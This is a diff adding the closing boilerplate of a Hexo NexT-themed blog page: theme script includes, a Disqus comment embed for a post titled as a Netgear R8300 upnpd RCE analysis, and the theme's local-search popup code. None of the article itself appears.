+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://0x43434343.com/2020/08/24/202008241640/';
+          this.page.identifier = '2020/08/24/202008241640/';
+          this.page.title = 'Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://fenixns.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
